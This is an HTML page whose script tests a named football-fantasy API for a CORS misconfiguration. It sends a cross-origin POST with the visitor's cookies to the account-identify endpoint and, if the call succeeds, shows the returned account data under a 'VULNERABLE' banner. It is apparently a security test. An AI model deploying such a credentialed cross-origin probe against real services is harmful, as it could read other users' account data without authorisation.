<!DOCTYPE html>
<html>
<head>
    <title>CORS Vulnerability Test</title>
</head>
<body>
    <h1>CORS Test from Different Origin</h1>
    <button onclick="testCORS()">Test API Access</button>
    <div id="result"></div>

    <script>
        async function testCORS() {
            const resultDiv = document.getElementById('result');
            resultDiv.innerHTML = 'Testing...';
            
            try {
                // Replace with your actual bearer token
                // Test if cookies are automatically sent cross-origin
                const response = await fetch('https://api.pro.football.fun/v1/accounts/identify', {
                    method: 'POST',
                    credentials: 'include'  // This tells browser to include cookies
                    // No Authorization header needed - cookies should handle auth
                });
                
                if (response.ok) {
                    const data = await response.json();
                    resultDiv.innerHTML = `
                        <h3 style="color: red;">ðŸš¨ VULNERABLE! ðŸš¨</h3>
                        <p>Successfully accessed API from different origin</p>
                        <pre>${JSON.stringify(data, null, 2)}</pre>
                    `;
                } else {
                    resultDiv.innerHTML = `
                        <h3 style="color: orange;">Response: ${response.status}</h3>
                        <p>${await response.text()}</p>
                    `;
                }
            } catch (error) {
                if (error.message.includes('CORS')) {
                    resultDiv.innerHTML = `
                        <h3 style="color: green;">âœ… PROTECTED</h3>
                        <p>CORS blocked the request: ${error.message}</p>
                    `;
                } else {
                    resultDiv.innerHTML = `
                        <h3 style="color: orange;">Error</h3>
                        <p>${error.message}</p>
                    `;
                }
            }
        }
    </script>
</body>
</html>
